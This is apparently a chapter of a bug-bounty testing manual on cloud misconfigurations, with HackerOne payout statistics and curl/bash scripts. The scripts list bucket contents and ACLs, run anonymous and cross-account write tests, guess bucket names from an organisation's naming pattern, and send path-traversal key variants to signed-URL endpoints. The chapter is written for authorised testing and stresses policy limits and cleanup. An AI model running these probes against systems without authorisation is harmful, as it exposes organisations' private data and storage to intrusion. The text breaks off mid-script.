# CLD · Cloud, storage buckets & CI/CD exposure

> A cloud resource the organisation depends on answers an identity it was never meant to trust: nobody, any
> account of the same cloud, or an account anyone can create. Buckets that list, Firebase rules that say `true`, a
> Cognito pool that hands out AWS credentials, a CI server that admits any Google account, a registry or cluster
> API without a login. It pays for the organisation's non-public data or a staff-only action, shown with the least
> access possible. A bucket name, a bucket that is public on purpose, or a key nobody validated is informative.

| | |
|---|---|
| **Class** | `cloud` |
| **Applies when** | http\|ip\|cloud-storage |
| **Pays** | 139 disclosed reports, 34 paid, median $750, top $15,000 (130 more in other classes touch it). The best-paid reached a management plane: a Kubernetes API without authorisation ($25,000, filed under RCE), a Jenkins any Google account could log in to ($15,000), production Grafana open to a guest ($10,000). Bucket reports pay $100 to $2,900, by what the bucket holds. |
| **Weaknesses** | Incorrect Permission Assignment for Critical Resource · CWE-732 · Improper Access Control - Generic · CWE-284 · Missing Authentication for Critical Function · CWE-306 · Authentication Bypass Using an Alternate Path or Channel · CWE-288 · Improper Authentication - Generic · CWE-287 · Insufficiently Protected Credentials · CWE-522 · Inclusion of Functionality from Untrusted Control Sphere · CWE-829 · Information Disclosure · CWE-538 |

## Why it pays

Cloud resources are configured, not coded, and their access rules are set by whoever created the project, often
once and in a hurry. Every provider has a principal that means "anyone": `AllUsers` and `AuthenticatedUsers` on
S3, `allUsers` and `allAuthenticatedUsers` on Google Cloud Storage, a public container on Azure, `".read": true`
in Firebase, the unauthenticated role of a Cognito identity pool, `system:anonymous` and, on GKE, any Google
account in `system:authenticated`. This chapter finds the resources an asset depends on and asks each of them,
with the least privileged identity available, for something only the organisation should get.

The money follows the plane, not the bucket. The three best-paid reports were management planes: a Kubernetes API
on which an outsider ran jobs as cluster-admin and reached credentials ($25,000, #455645), a Jenkins that accepted
any Google account and exposed API tokens and the script console ($15,000, #231460), and production Grafana
dashboards readable by a guest ($10,000, #663628). Signed URLs paid when the signer was the bug: a `../` in a file
name produced a valid download link for any file in the bucket ($1,500, #94087), and an upload link that worked
more than once let a researcher poison a CI cache and read build secrets ($8,000, #2255750, filed under RCE).

Buckets are the volume. By title, 104 reports in the index name a bucket, S3 or GCS: 24 carry a bounty, median
$500, top $2,900 (#1021906, other users' images). Grants to "any authenticated AWS user" recur (15 reports, 5 paid,
median $140, top $1,000 for #98819), and the rating follows what the bucket holds: an iOS test build with its
configuration was rated critical ($1,500, #404822), a listing of public assets is informative. Writes are rarer
than reads and are rated by what reads the bucket afterwards (21 reports name a write: 4 paid, median $375, top
$2,000, #93691).

Firebase and Cognito are thin in the paid set: nine Firebase reports and one Cognito report by title, none with a
bounty in the index. The two Firebase reports rated highest are titled database takeovers (#684099 critical,
#1065134 high), and the Cognito one is an account takeover through the user-pool API (#1342088). Build outputs are
a steadier market: tokens in public CI logs paid $5,000 (#496937) and $2,000 (#215625). The best-paid GitHub Actions
reports are bugs in GitHub's own toolkit and runner (#1625652 at $4,617, #1637621 at $4,000); against a programme's
own workflows, #1548870 paid $1,500.

## The crux question

**Which cloud resources does this asset depend on, and does any of them answer an identity the organisation
never meant to trust: nobody, any account of the same cloud, or an account I can create myself?**

## Applicability probe

The chapter gate `http|ip|cloud-storage` is true for almost every asset; the items carry the real gates. Three
observations settle them for one asset: the cloud names its pages and bundles use, the provider in front of the
host name, and the product answering on each web port.

```bash
source "$E/env.sh"; D="$E/evidence/$H/CLD-probe"; mkdir -p "$D"
# 1. cloud names in everything recon saved for this host: storage, Firebase, Cognito, serverless and provider hosts
grep -rhoiE '[a-z0-9.-]+\.s3[.-][a-z0-9.-]*amazonaws\.com|s3[.-][a-z0-9.-]*amazonaws\.com/[a-z0-9.-]+|[a-z0-9._-]+\.storage\.googleapis\.com|storage\.googleapis\.com/[a-z0-9._-]+|[a-z0-9]+\.blob\.core\.windows\.net|[a-z0-9-]+\.[a-z0-9-]+\.digitaloceanspaces\.com|[a-z0-9-]+\.(firebaseio\.com|firebasedatabase\.app)|(firebasestorage|firestore|identitytoolkit)\.googleapis\.com|cognito-(idp|identity)\.[a-z0-9-]+\.amazonaws\.com|[a-z]{2}-[a-z]+-[0-9]_[A-Za-z0-9]{8,12}|[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}|[a-z0-9]+\.execute-api\.[a-z0-9-]+\.amazonaws\.com|[a-z0-9]+\.lambda-url\.[a-z0-9-]+\.on\.aws|[a-z0-9-]+\.cloudfunctions\.net|[a-z0-9-]+\.run\.app|[a-z0-9-]+\.azurewebsites\.net' \
  "$E/recon/$H/" 2>/dev/null | sort | uniq -c | sort -rn | tee "$D/cloud-names.txt" | head -40
# 2. the provider in front of the host name
dig +short CNAME "$H"
curl -sS "${HDR[@]}" -D- -o /dev/null "$T/sane$RANDOM" \
  | grep -iE '^(server|via|x-amz-[a-z-]+|x-amzn-[a-z-]+|apigw-requestid|x-goog-[a-z-]+|x-guploader-uploadid|x-ms-[a-z-]+|x-azure-ref|x-cloud-trace-context):'
# 3. a registry, a Kubernetes API or a CI server answering on this host or port
for p in /v2/ /version /whoAmI/api/json /api/v4/version /api/version; do
  curl -sSk "${HDR[@]}" -o /dev/null -w "%{http_code} %{content_type} $p\n" "$T$p"; done
```

```bash
scripts/sane fact set "$H" cloud-storage=1 --ev "main.js loads avatars from acme-user-uploads.s3.amazonaws.com"
scripts/sane fact set "$H" cloud-storage=1 --ev "firebaseConfig in app.js: projectId acme-prod, databaseURL acme-prod-default-rtdb.firebaseio.com"
scripts/sane fact set "$H" known-product=1 --ev "/v2/ answers Docker-Distribution-Api-Version: registry/2.0"
scripts/sane fact set "$H" cloud-storage=0 --ev "no storage, Firebase or provider host in pages, bundles, headers or DNS; media served from the app origin"
scripts/sane fact set @eng code-host-token=1 --ev "GH_TOKEN of our own GitHub account, member of no organisation"
```

No fact marks Cognito, Firebase or a serverless backend: note the ids step 1 finds in `$E/recon/$H/map.md`, and the
cards read the bundles again themselves. Three policy questions decide whole items; record the answers in the
engagement notes. Does the programme allow write tests (CLD-002, CLD-005, CLD-012)? Does its scope cover the
organisation's cloud resources in general, or only listed hosts (CLD-003)? Does it list source repositories
(CLD-010, CLD-011)? An asset with `http`, `ip` and `cloud-storage` all false closes the chapter and the planner
writes the reason; with `cloud-storage`, `known-product`, `login` and `api` false, only CLD-008, CLD-014 and, behind
a CDN or proxy, CLD-013 stay open.

## Triage order

CLD-001 (bucket reads: a few GETs per bucket) → CLD-005 (Firebase: one GET before any sign-up) → CLD-012 (registry
and cluster APIs: a handful of GETs, the highest ceiling) → CLD-008 (identity pool: two unauthenticated calls) →
CLD-014 (state files: a dozen GETs) → CLD-013 (provider names, stages and origin) → CLD-006 (self sign-up on a
closed pool) → CLD-007 (attribute writes, two accounts) → CLD-004 (signed URLs, two accounts) → CLD-009 (CI with an
account of our own) → CLD-002 (write tests: read the policy first) → CLD-003 (bucket names, once per programme) →
CLD-011 (images and artefacts, once per programme) → CLD-010 (workflow review, once per programme).

## Items

### CLD-001 · A bucket the asset uses lists its keys or serves a non-public object to an anonymous request or to any authenticated cloud account

| | |
|---|---|
| **Severity** | High standalone when the listing or a readable object holds users' files, personal data, backups, source or configuration; Medium for internal material of low sensitivity; Low for a listing of files the site already serves; Critical with a credential in an object that one identity call proves live |
| **Requires** | cloud-storage |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Incorrect Permission Assignment for Critical Resource · CWE-732 |
| **Prior art** | #1021906, #404822, #98819, #710319 |

- **Where:** every bucket the asset names: storage host names in its pages, bundles and API responses (upload and
  download URLs, image sources, CSP `connect-src` and `img-src`), the CNAME of the host itself
  (`<bucket>.s3-website-<region>.amazonaws.com`, `c.storage.googleapis.com`), and S3 error XML served through the
  CDN (`<BucketName>` in a `NoSuchBucket` body). Providers: S3 in virtual-host and path style, Google Cloud
  Storage, Azure Blob (`<account>.blob.core.windows.net/<container>`), DigitalOcean Spaces. Note what the
  application keeps in each: public assets, user uploads, exports, backups, builds.
- **Test:** the bucket policy or ACL grants list or read to everyone (`AllUsers`, `allUsers`, an Azure container
  whose public access level is "container") or to any principal of the provider (`AuthenticatedUsers` on S3,
  `allAuthenticatedUsers` on GCS). Ask each bucket's REST endpoint for its key listing, its ACL and, on GCS, the
  permissions the caller holds: first with no credentials, then signed by our own cloud account. Then fetch one
  object the application treats as private, our own account B's upload, without the signature the application
  adds to its link.
- **How:**
  ```bash
  D="$E/evidence/$H/CLD-001"; mkdir -p "$D"
  # 1. bucket names from DNS and from everything recon saved for this host, as "<provider> <name>" lines
  RX='[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]\.s3[.-]([a-z0-9-]+[.-])*amazonaws\.com|s3[.-]([a-z0-9-]+\.)*amazonaws\.com/[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]|[a-z0-9][a-z0-9._-]{1,61}[a-z0-9]\.storage\.googleapis\.com|storage\.googleapis\.com/[a-z0-9][a-z0-9._-]{1,61}[a-z0-9]|[a-z0-9]{3,24}\.blob\.core\.windows\.net/[a-z0-9][a-z0-9-]{1,61}[a-z0-9]|[a-z0-9-]+\.[a-z0-9-]+\.digitaloceanspaces\.com|c\.storage\.googleapis\.com'
  { dig +short CNAME "$H"; grep -rhoiE "$RX" "$E/recon/$H/" 2>/dev/null; } | tr 'A-Z' 'a-z' | sed -E \
    -e 's#\.$##' -e "s#^c\.storage\.googleapis\.com\$#gcs $H#" \
    -e 's#^([a-z0-9.-]+)\.s3[.-]([a-z0-9-]+[.-])*amazonaws\.com$#s3 \1#' \
    -e 's#^s3[.-]([a-z0-9-]+\.)*amazonaws\.com/([a-z0-9.-]+)$#s3 \2#' \
    -e 's#^([a-z0-9._-]+)\.storage\.googleapis\.com$#gcs \1#' -e 's#^storage\.googleapis\.com/([a-z0-9._-]+)$#gcs \1#' \
    -e 's#^([a-z0-9]+)\.blob\.core\.windows\.net/([a-z0-9-]+)$#azure \1/\2#' -e 's#^(.+)\.digitaloceanspaces\.com$#spaces \1#' \
    | grep -E '^(s3|gcs|azure|spaces) ' | sort -u | tee "$D/buckets.txt"
  ```
  ```bash
  # 2. each bucket's REST endpoint with no credentials: listing, ACL, old versions, and on GCS the caller's permissions
  W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  g(){ curl -sS "${HDR[@]}" -m 20 -o "$D/$2" -w "%{http_code} %{size_download} $2\n" "$1"; sleep "$W"; }
  while read -r P N; do f=$(printf '%s-%s' "$P" "$N" | tr '/' '_')
    case "$P" in
      s3)     g "https://$N.s3.amazonaws.com/?list-type=2&max-keys=25" "$f.list.xml"; g "https://$N.s3.amazonaws.com/?acl" "$f.acl.xml"
              g "https://$N.s3.amazonaws.com/?versions&max-keys=25" "$f.versions.xml"
              curl -sS "${HDR[@]}" -I "https://$N.s3.amazonaws.com/" | grep -i '^x-amz-bucket-region' | tr -d '\r' > "$D/$f.region" ;;
      gcs)    g "https://storage.googleapis.com/storage/v1/b/$N/o?maxResults=25&fields=items(name,size,updated)" "$f.list.json"
              g "https://storage.googleapis.com/storage/v1/b/$N/iam/testPermissions?permissions=storage.objects.list&permissions=storage.objects.get&permissions=storage.objects.create&permissions=storage.buckets.getIamPolicy&permissions=storage.buckets.setIamPolicy" "$f.perms.json" ;;
      azure)  g "https://${N%%/*}.blob.core.windows.net/${N#*/}?restype=container&comp=list&maxresults=25" "$f.list.xml" ;;
      spaces) g "https://$N.digitaloceanspaces.com/?max-keys=25" "$f.list.xml"; g "https://$N.digitaloceanspaces.com/?acl" "$f.acl.xml" ;;
    esac
  done < "$D/buckets.txt"
  grep -oE '<(Code|KeyCount|IsTruncated|Key|Name)>[^<]{0,100}|groups/global/[A-Za-z]+</URI></Grantee><Permission>[A-Z_]+' "$D"/*.xml | head -60
  for f in "$D"/*.json; do printf '%s ' "${f##*/}"; jq -c '{items: [.items[]?.name][0:10], permissions, error: .error.message}' "$f"; done
  ```
  ```bash
  # 3. the same requests signed by our own cloud account, i.e. "any authenticated principal" of the provider.
  #    cloud.env: AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY of an IAM user in our own AWS account holding only the
  #    AWS-managed AmazonS3ReadOnlyAccess policy (a cross-account read needs our side's permission too), and
  #    GCP_TOKEN=$(gcloud auth print-access-token) for our own Google account
  source "$E/accounts/cloud.env"
  while read -r P N; do f=$(printf '%s-%s' "$P" "$N" | tr '/' '_')
    case "$P" in
      s3)  RG=$(awk '{print $2}' "$D/$f.region"); RG=${RG:-us-east-1}
           for q in 'list-type=2&max-keys=25' 'acl'; do
             curl -sS "${HDR[@]}" --aws-sigv4 "aws:amz:$RG:s3" --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" \
               -o "$D/$f.own.${q%%=*}.xml" -w "%{http_code} $f $q as any AWS account\n" "https://$N.s3.$RG.amazonaws.com/?$q"; sleep 1; done ;;
      gcs) curl -sS "${HDR[@]}" -H "Authorization: Bearer $GCP_TOKEN" -o "$D/$f.own.perms.json" -w "%{http_code} $f as any Google account\n" \
             "https://storage.googleapis.com/storage/v1/b/$N/iam/testPermissions?permissions=storage.objects.list&permissions=storage.objects.get&permissions=storage.objects.create" ;;
    esac
  done < "$D/buckets.txt"
  # 4. one object the application treats as private: B's own upload as the application links it for B, minus the signature
  OBJ='<URL of a file B uploaded, as the application links it in B session>'
  curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code} %{size_download} %{content_type} unsigned\n' "${OBJ%%\?*}"
  ```
  Azure has no "any authenticated account" principal for blob data, so step 3 does not apply to it.
- **Proof:** the unsigned (or own-account) request and its response saved raw: a `ListBucketResult` with its
  `KeyCount` and first key names, an ACL with an `AllUsers` or `AuthenticatedUsers` grant, a GCS `testPermissions`
  answer listing `storage.objects.list` for an anonymous or foreign caller, or B's private upload returned without
  a signature. Beside it: the page, bundle line or response that shows the asset uses the bucket, and what the keys
  are (prefix structure and counts). Key names carrying other people's names or addresses are reported as a count
  and a shape, never pasted (PB-14). For an "any authenticated user" grant, state that the signer was an unrelated
  account of ours that the organisation never granted anything.
- **Not a finding when:** the bucket is public by design: static assets, the CDN origin of public pages, a download
  mirror, a public dataset, every key already linked from the site. `AccessDenied` on the listing while objects open
  by URL is how a public-read website bucket works; it is a finding only when an object meant to be private opens
  (step 4). `NoSuchBucket` is not this card: a referenced bucket that no longer exists belongs to the takeover
  chapter. `PermanentRedirect` or `AuthorizationHeaderMalformed` means the wrong region, not a refusal: repeat on
  the region from `x-amz-bucket-region`. A website endpoint (`s3-website`) never lists: ask the REST endpoint. A 200
  from a CDN in front of the bucket that returns the single-page app's shell. A bucket of a vendor whose SDK the site
  uses (`third-party`). An unguessable object key that opens without a signature is a capability URL by design,
  unless a listing or another route discloses the keys.
- **Escalate:** read the key names before anything else. Backups (`.sql`, `.bak`, `.tar.gz`), `.env` and
  configuration are read only far enough to find a credential, which gets one identity call (`GetCallerIdentity`
  for a cloud key) and nothing else. `*.tfstate` keys go to CLD-014, CI artefacts to CLD-011; deleted objects that
  survive in `?versions` count like live ones. An ACL with `WRITE`, `WRITE_ACP` or `FULL_CONTROL` for `AllUsers` or
  `AuthenticatedUsers`, or a GCS answer listing `storage.objects.create`, is CLD-002's evidence without a single
  write. Names that follow a pattern (`acme-prod-*`) feed CLD-003. B's file opening without a signature joins
  BAC-004.

### CLD-002 · A bucket the asset uses accepts an object write from an anonymous request or from any authenticated cloud account

| | |
|---|---|
| **Severity** | High standalone for a write to a bucket the application serves to its users or reads back; Critical when the bucket serves scripts the site runs or files an installer or build downloads; Low when nothing the organisation serves or reads uses the bucket |
| **Requires** | cloud-storage |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Incorrect Permission Assignment for Critical Resource · CWE-732 |
| **Prior art** | #98819, #94502, #772957, #504600 |

- **Where:** the buckets the asset names (pages, bundles, API responses, the host's CNAME), first those the site
  loads scripts, styles or downloads from (`<script src>` and `<link href>` hosts of its pages), then those behind
  upload features, then the rest. A readable ACL that already shows `WRITE`, `WRITE_ACP` or `FULL_CONTROL` for
  `AllUsers` or `AuthenticatedUsers` settles the question without a write.
- **Test:** the policy or ACL grants object creation to everyone or to any principal of the provider. Read-only
  evidence first: the ACL (`?acl`) and, on GCS, `testIamPermissions`, which reports `storage.objects.create` without
  creating anything. On S3 the least invasive signal is a multipart upload started and aborted at once, which leaves
  no object. Only when the policy allows write tests: one text file with a unique name under a new prefix, read
  back, then deleted, which also shows whether delete is allowed. Never overwrite, rename or delete a key that is
  not ours, and never call an ACL or policy write.
- **How:**
  ```bash
  D="$E/evidence/$H/CLD-002"; mkdir -p "$D"; U=$(jq -r '.authorisation.h1_username // empty' "$E/engagement.json"); U=${U:-researcher}
  N='<bucket name the asset uses>'; M="h1-$U-cld002-$(date -u +%Y%m%d%H%M%S)-$RANDOM.txt"
  # 1. read-only evidence: the ACL grants to everyone or to any AWS account, and the GCS permissions of an anonymous caller
  curl -sS "${HDR[@]}" "https://$N.s3.amazonaws.com/?acl" | grep -oE 'groups/global/[A-Za-z]+</URI></Grantee><Permission>[A-Z_]+'
  curl -sS "${HDR[@]}" "https://storage.googleapis.com/storage/v1/b/$N/iam/testPermissions?permissions=storage.objects.create&permissions=storage.objects.delete" | jq -c .
  ```
  ```bash
  # 2. S3 with no credentials: start a multipart upload and abort it at once (requires s3:PutObject, creates no object)
  R=$(curl -sS "${HDR[@]}" -X POST "https://$N.s3.amazonaws.com/sane-test/$M?uploads"); echo "$R" | grep -oE '<(UploadId|Code)>[^<]{0,40}'
  UPID=$(echo "$R" | grep -oE '<UploadId>[^<]+' | cut -d'>' -f2)
  [ -n "$UPID" ] && curl -sS "${HDR[@]}" -X DELETE -o /dev/null -w '%{http_code} aborted\n' "https://$N.s3.amazonaws.com/sane-test/$M?uploadId=$UPID"
  # 3. only when the policy allows write tests: one marker file, read back without credentials, deleted, confirmed gone
  printf 'Harmless write test by HackerOne user %s for %s at %s UTC. Safe to delete.\n' "$U" "$H" "$(date -u '+%F %T')" > "$D/$M"
  echo "$(date -u +%FT%TZ) s3://$N/sane-test/$M created by CLD-002 (deleted in the next lines)" >> "$D/cleanup.md"
  curl -sS "${HDR[@]}" -X PUT -H 'Content-Type: text/plain' --data-binary @"$D/$M" -D "$D/put.headers" -o /dev/null -w '%{http_code} put\n' "https://$N.s3.amazonaws.com/sane-test/$M"
  curl -sS "${HDR[@]}" -w '\n%{http_code} read back\n' "https://$N.s3.amazonaws.com/sane-test/$M"
  curl -sS "${HDR[@]}" -X DELETE -o /dev/null -w '%{http_code} delete\n' "https://$N.s3.amazonaws.com/sane-test/$M"
  curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code} after delete\n' "https://$N.s3.amazonaws.com/sane-test/$M"
  ```
  ```bash
  # 4. the same as any authenticated AWS account: our own IAM user, whose own policy allows s3:PutObject and
  #    s3:DeleteObject. bucket-owner-full-control leaves the organisation in control of the marker if the delete fails.
  source "$E/accounts/cloud.env"; RG=$(curl -sS "${HDR[@]}" -I "https://$N.s3.amazonaws.com/" | grep -i '^x-amz-bucket-region' | awk '{print $2}' | tr -d '\r')
  S=(--aws-sigv4 "aws:amz:${RG:=us-east-1}:s3" --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY")
  curl -sS "${HDR[@]}" "${S[@]}" -X PUT -H 'x-amz-acl: bucket-owner-full-control' -H 'Content-Type: text/plain' --data-binary @"$D/$M" \
    -o /dev/null -w '%{http_code} put as any AWS account\n' "https://$N.s3.$RG.amazonaws.com/sane-test/$M"
  curl -sS "${HDR[@]}" "${S[@]}" -X DELETE -o /dev/null -w '%{http_code} delete\n' "https://$N.s3.$RG.amazonaws.com/sane-test/$M"
  ```
  GCS takes the same marker at `https://$N.storage.googleapis.com/sane-test/$M` (PUT, GET, DELETE), anonymous or
  with `-H "Authorization: Bearer $GCP_TOKEN"`. A bucket name with a dot fails TLS in that form and needs the path
  form on `storage.googleapis.com`, which the scope guard refuses for a write until the host is recorded. Azure
  offers no anonymous write.
- **Proof:** the read-only evidence (the ACL grant or the GCS permission list) or the multipart start returning an
  `UploadId` and its abort; for a write test, the PUT's status and `ETag`, the anonymous read of the marker, the
  DELETE and the 404 after it, with timestamps and the marker's text. Show that the asset uses the bucket and what
  the bucket serves (for example the script the home page loads from it), which sets the severity. The marker is in
  `cleanup.md`, marked deleted.
- **Not a finding when:** the write goes through an upload feature that is anonymous by design (a public support
  upload with a pre-signed POST policy: the upload chapter's ground). The 200 comes from a CDN or a website endpoint
  and the object never exists on read-back: website endpoints refuse PUT with 405, and a single-page app's catch-all
  answers 200 to anything. The multipart start answers `AccessDenied` and the ACL is unreadable: S3 has no read-only
  route to write permission, and a write test the policy does not allow is not run (mark `skipped` with the policy
  sentence). The bucket is ours or a vendor's (`third-party`). A write to a scratch bucket nothing reads is storage
  abuse at best and many programmes rate it low.
- **Escalate:** a bucket the home page loads scripts from is stored script for every visitor: prove it with a new
  key fetched through the asset's own domain or CDN path when that path maps onto the bucket, never by touching a
  served file, and describe the rest. A bucket that a build, installer or update channel fetches from is a
  supply-chain position (#329689 shows the shape with an unclaimed bucket): describe it. `WRITE_ACP` or
  `FULL_CONTROL` for anyone lets anyone take over the bucket's permissions: report it from the ACL, never exercise
  it. A write the application later processes (thumbnails, imports) joins the upload chapter's file-processing items.

### CLD-003 · A bucket that no asset references, named after the organisation's naming pattern, belongs to the organisation and lists or accepts writes from anyone

| | |
|---|---|
| **Severity** | High standalone when the bucket is proven the organisation's and holds non-public data or accepts writes; Medium for internal material of low sensitivity; None while ownership is not proven |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | programme |
| **Cost** | medium |
| **Weakness** | Incorrect Permission Assignment for Critical Resource · CWE-732 |
| **Prior art** | #94502, #57505, #222724 |

- **Where:** no asset fact predicts this, so the item is open on every engagement; the requests go to the cloud
  providers' public endpoints once per programme, not to an in-scope host. Read the policy first: report only a
  bucket the policy covers (assets the organisation owns, not only the listed hosts); when the scope is a list of
  host names, ask the operator before testing what turns up. Seed words: the organisation's and products' names,
  the labels of in-scope domains, its GitHub organisation and mobile bundle ids, and the shape of buckets already
  seen on its assets (`acme-prod-uploads` suggests `acme-<env>-<purpose>`). #94502 is the shape: several buckets
  named after the company, two of them its own and world-readable.
- **Test:** generate a few hundred names from the seeds and the pattern, ask each provider whether each exists, run
  the anonymous listing on the ones that do, and prove ownership before reporting any.
- **How:**
  ```bash
  D="$E/evidence/@programme/CLD-003"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  printf '%s\n' acme acmecorp acme-corp > "$D/seeds.txt"            # the organisation's own names: edit
  printf '%s\n' assets static media images img uploads files backup backups data logs dev staging stage prod production \
    test qa public private internal cdn web www app api docs reports exports build builds artifacts releases downloads \
    terraform tfstate state config db dump archive > "$D/words.txt"
  while read -r s; do echo "$s"; while read -r w; do printf '%s-%s\n%s-%s\n%s%s\n%s.%s\n' "$s" "$w" "$w" "$s" "$s" "$w" "$s" "$w"; done < "$D/words.txt"; done < "$D/seeds.txt" \
    | grep -E '^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$' | sort -u > "$D/candidates.txt"; wc -l < "$D/candidates.txt"
  # existence: 404 is a free name on S3 and GCS, anything else is taken; an Azure storage account is a DNS name
  while read -r n; do
    case "$n" in *.*) u="https://s3.amazonaws.com/$n/" ;; *) u="https://$n.s3.amazonaws.com/" ;; esac
    s3=$(curl -sS "${HDR[@]}" -I -o /dev/null -w '%{http_code}' "$u")
    gcs=$(curl -sS "${HDR[@]}" -I -o /dev/null -w '%{http_code}' "https://storage.googleapis.com/$n/")
    a=$(printf %s "$n" | tr -d '.-'); az=$([ ${#a} -le 24 ] && dig +short "$a.blob.core.windows.net" | head -1)
    echo "$n s3=$s3 gcs=$gcs azure=${az:+exists}"; sleep "$W"
  done < "$D/candidates.txt" | tee "$D/exists.txt" | grep -vE ' s3=404 gcs=404 azure=$'
  ```
  ```bash
  # the anonymous listing of every name that exists
  grep -v ' s3=404' "$D/exists.txt" | cut -d' ' -f1 | grep -v '\.' | while read -r n; do
    curl -sS "${HDR[@]}" -o "$D/s3-$n.xml" -w "%{http_code} s3 $n\n" "https://$n.s3.amazonaws.com/?list-type=2&max-keys=20"; sleep "$W"; done
  grep -v ' gcs=404' "$D/exists.txt" | cut -d' ' -f1 | while read -r n; do
    curl -sS "${HDR[@]}" -o "$D/gcs-$n.json" -w "%{http_code} gcs $n\n" "https://storage.googleapis.com/storage/v1/b/$n/o?maxResults=20&fields=items(name)"; sleep "$W"; done
  grep -l '<ListBucketResult' "$D"/s3-*.xml; grep -l '"items"' "$D"/gcs-*.json
  # Azure: a short list of container names on each account that exists
  grep 'azure=exists' "$D/exists.txt" | cut -d' ' -f1 | tr -d '.-' | while read -r a; do for c in public assets images media files uploads backup data static; do
    curl -sS "${HDR[@]}" -o /dev/null -w "%{http_code} azure $a/$c\n" "https://$a.blob.core.windows.net/$c?restype=container&comp=list&maxresults=5"; sleep "$W"; done; done | grep '^200'
  ```
- **Proof:** the existence answer, the listing (key count, first key names, prefix structure) and the ownership
  evidence: a key or object that names the organisation or its products, a reference to the bucket in the
  organisation's code, pages or app, the same region and naming as its known buckets, or, on GCS, a name ending in
  one of the organisation's domains (only a verified owner of that domain can create it). Without ownership
  evidence nothing is reported.
- **Not a finding when:** the name belongs to someone else: another company with a similar name, a squatter, a
  researcher's canary bucket (a `poc.txt`, a README addressed to bounty hunters). A listing of material the
  organisation publishes anyway (#222724: one of the two reported buckets was public by design). A bucket that
  exists and refuses the listing (403): existence is not exposure. A long candidate list against a policy that
  covers only named hosts.
- **Escalate:** a proven, listable bucket gets CLD-001's ACL and object checks and, where writes are allowed,
  CLD-002. `terraform`, `tfstate` and `state` names go straight to CLD-014's reading rules. New names in a listing
  (log buckets, replicas, `-backup` twins) refine the pattern for another pass.

### CLD-004 · A signed URL or SAS token the asset issues grants more than the one object and operation the feature needs

| | |
|---|---|
| **Severity** | High standalone when our account obtains a working URL or token for the second account's private object; Medium when a token grants a whole container, listing or write but only our own objects are shown; Low when the only excess is lifetime |
| **Requires** | cloud-storage, upload\|export, two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Insecure Direct Object Reference (IDOR) · CWE-639 |
| **Prior art** | #94087, #2255750, #2337427, #254200 |

- **Where:** every response that carries a signed storage URL or token, and the request that minted it: S3
  (`X-Amz-Signature`, `X-Amz-Credential`, `X-Amz-Expires`; legacy `Signature`, `Expires`, `AWSAccessKeyId`), GCS
  (`X-Goog-Signature`; legacy `GoogleAccessId`), Azure SAS (`sv`, `sr`, `sp`, `se`, `sig`), CloudFront signed URLs
  and cookies (`Policy`, `Signature`, `Key-Pair-Id`, the `CloudFront-Policy` cookie), and application redirects
  that end in one (`/rails/active_storage/blobs/redirect/...`). The minting requests are download, preview, share,
  export and upload endpoints whose parameters name a file id, key, path, file name or folder.
- **Test:** a signature binds whatever the signer chose to sign, so the flaws are in what the signer accepts and how
  wide the grant is. Four checks, as A: (1) ask the signer for B's object by id, by key, and by a key that climbs
  out of A's prefix (`../`, `%2e%2e%2f`), because some signers authorise the path they were given and normalise it
  afterwards (#94087); (2) decode every token's scope: an Azure SAS with `sr=c` or an account SAS (`ss`, `srt`) and
  `sp` beyond `r`, a CloudFront policy whose `Resource` ends in `*`, a lifetime longer than the session; (3) use a
  container-wide token to list the container and look for B's blob; (4) reuse A's own pre-signed upload URL after
  the application has accepted the first file, because an upload URL that works twice lets whoever holds it replace
  a file the application already checked (#2255750).
- **How:**
  ```bash
  D="$E/evidence/$H/CLD-004"; mkdir -p "$D"
  # 1. signed URLs saved for this host, and what each grants (decoded offline)
  grep -rhoE "[a-z]+://[^\"' <>()]+[?&](X-Amz-Signature|X-Goog-Signature|Signature|sig)=[^\"' <>()]*" "$E/recon/$H/" "$E/evidence/$H/" 2>/dev/null | sort -u > "$D/signed.txt"
  jq -R -c 'split("?") as $u | {host: ($u[0] | split("/")[2]), path: ($u[0] | split("/")[3:] | join("/")),
    grant: (($u[1] // "") | split("&") | map(split("=") | {(.[0]): (.[1] // "")}) | add // {}
      | with_entries(select(.key | test("^(X-Amz-Expires|X-Amz-Date|X-Goog-Expires|Expires|sr|sp|se|st|ss|srt|sip|spr)$"))))}' "$D/signed.txt"
  # CloudFront custom policy (the Policy parameter or the CloudFront-Policy cookie): which resources, until when
  POL='<Policy value>'; printf '%s' "$POL" | tr -- '-_~' '+=/' | base64 -d 2>/dev/null | jq -c '.Statement[] | {Resource, until: .Condition.DateLessThan}'
  ```
  ```text
  key variants for check 1 (B uploads first; B's id and key come from B's own session)
  <B's file id>
  <B's object key, e.g. uploads/<B id>/report.pdf>
  <A's key prefix>/../<B id>/report.pdf
  <A's key prefix>/..%2f<B id>%2freport.pdf
  <A's key prefix>/%2e%2e/<B id>/report.pdf
  ```
  ```bash
  # 2. the minting request from the proxy history, replayed by A with each variant (one per line in variants.txt)
  while read -r k; do
    curl -sS "${HDR[@]}" $A -X POST "$T/api/files/sign" -H 'Content-Type: application/json' --data-raw "{\"key\":\"$k\"}" -w '\n%{http_code}\n'; sleep 1
  done < "$D/variants.txt" | tee "$D/a-asks-for-b.txt"
  curl -sS "${HDR[@]}" -o "$D/b-file-via-a.bin" -w '%{http_code} %{size_download} %{content_type}\n' "$(grep -m1 -oE 'https://[^"]+' "$D/a-asks-for-b.txt")"
  # 3. a container-wide SAS: list the container with A's token and look for B's blob name
  U=$(grep -m1 '\.blob\.core\.windows\.net/.*[?&]sig=' "$D/signed.txt"); C=$(printf '%s' "${U%%\?*}" | cut -d/ -f1-4)
